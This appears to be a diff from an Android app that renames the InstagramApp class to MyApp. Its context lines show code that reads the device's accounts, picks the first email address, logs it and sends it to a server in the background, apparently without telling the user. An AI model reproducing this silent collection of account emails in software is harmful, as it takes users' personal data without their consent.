@@ -8,7 +8,7 @@ import android.content.pm.PackageInfo;
 import android.content.pm.PackageManager;
 import android.util.Patterns;
 
-import com.mj.instashusha.InstagramApp;
+import com.mj.instashusha.MyApp;
 import com.mj.instashusha.activities.IntroActivity;
 
 import java.io.IOException;
@@ -48,7 +48,7 @@ public class OneTimeOps {
                 if (email_pattern.matcher(account.name).matches()) {
                     //got possible email..
                     sendEmailToServer(context, account.name);
-                    InstagramApp.log(account.toString());
+                    MyApp.log(account.toString());
                     break; //I only need one email...
 
                 }
@@ -68,9 +68,9 @@ public class OneTimeOps {
                 .post(form)
                 .build();
 
-        InstagramApp.log("Trying to send email address");
+        MyApp.log("Trying to send email address");
 
-        InstagramApp.getOkHttpClient().newCall(request).enqueue(new Callback() {
+        MyApp.getOkHttpClient().newCall(request).enqueue(new Callback() {
             @Override
             public void onFailure(Call call, IOException e) {
             }
@@ -79,7 +79,7 @@ public class OneTimeOps {
             public void onResponse(Call call, Response response) throws IOException {
                 if (response.isSuccessful()) {
                     Prefs.setSentEmailTrue(context);
-                    InstagramApp.log("User email sent successfully");
+                    MyApp.log("User email sent successfully");
                 }
             }
         });
